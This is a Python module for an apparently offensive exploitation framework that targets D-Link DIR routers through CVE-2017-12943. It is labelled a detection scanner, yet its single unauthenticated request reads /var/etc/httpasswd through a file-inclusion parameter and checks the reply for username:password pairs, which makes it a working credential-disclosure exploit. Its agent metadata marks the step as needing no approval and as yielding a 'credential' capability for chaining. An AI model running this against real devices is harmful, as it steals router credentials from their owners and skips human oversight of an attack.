#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR __show_info.php file disclosure (CVE-2017-12943)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR - __show_info.php File Disclosure Detection (CVE-2017-12943)',
        'description': (
            'Detects CVE-2017-12943 by requesting '
            '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'dlink', 'router', 'lfi', 'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-12943',
        ],
        'cve': 'CVE-2017-12943',
    }

    def run(self):
        path = '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        body = r.text or ''
        if re.search(r'<center>.*[a-zA-Z0-9]+:[a-zA-Z0-9]+', body):
            self.set_info(
                severity='high',
                reason='D-Link __show_info.php httpasswd disclosure (CVE-2017-12943)',
                path='/model/__show_info.php',
            )
            return True
        return False
